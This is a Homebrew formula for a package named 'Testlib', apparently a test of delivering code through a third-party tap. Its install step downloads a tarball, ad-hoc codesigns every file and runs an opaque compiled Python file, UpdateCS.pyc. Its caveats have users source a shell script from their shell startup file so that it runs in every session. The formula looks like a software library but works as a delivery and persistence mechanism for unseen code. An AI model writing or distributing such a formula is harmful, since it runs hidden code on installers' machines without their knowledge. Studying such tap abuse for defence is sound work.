class Testlib < Formula
    desc "Test Tap Activate"
    homepage "https://github.com/Sw4mpf0x/"
    url "https://github.com/Sw4mpf0x/homebrew-test/releases/download/v2.74.9/testlib-2.74.9.tar.gz"
    sha256 "11dc09931424e9d390086f3e65517584827f40697b4137d7a230ae9c2d444c01"
    version "2.74.9"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "python3 #{bin}/UpdateCS.pyc"
      end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
